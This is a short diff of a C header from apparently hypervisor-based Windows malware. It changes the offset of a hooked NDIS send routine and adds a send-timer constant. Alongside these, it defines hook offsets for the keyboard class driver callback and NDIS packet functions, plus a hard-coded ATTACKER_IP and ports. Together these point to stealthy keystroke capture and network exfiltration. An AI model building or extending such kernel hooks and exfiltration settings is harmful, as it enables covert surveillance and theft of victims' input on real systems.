@@ -14,7 +14,7 @@
 #define KBDCLASS_SIGNATURE_OFFSET 0x89f8
 #define KBDCLASS_KeyboardClassServiceCallback_OFFSET 0x5583 // actually at 0x5570, but "push rbp" is a bit later
 
-#define NDIS_NdisSendNetBufferLists_OFFSET 0x2474   // actually at 0x2460, but "push rbp" is a bit later
+#define NDIS_ndisMSendNBLToMiniportInternal_OFFSET 0x4fbc   // actually at 0x4fb0, but "push rbp" is a bit later
 #define NDIS_NdisMIndicateReceiveNetBufferLists_OFFSET 0x4993   // actually at 0x4990, but "push r12" is a bit later
 
 
@@ -37,6 +37,8 @@ extern void handle_MiDriverLoadSucceeded_hook(vmexit_data_t *state);
 #define ATTACKER_IP 0xac1cb73f  // 172.28.183.63
 #define SRC_PORT 49321
 #define DST_PORT 49324
+
+#define SEND_TIMER_TIME 0x5ffffff
 
 extern qword_t find_windows_module(wchar_t *name, uint16_t len);
 extern uint64_t guest_virtual_to_physical(uint64_t addr);
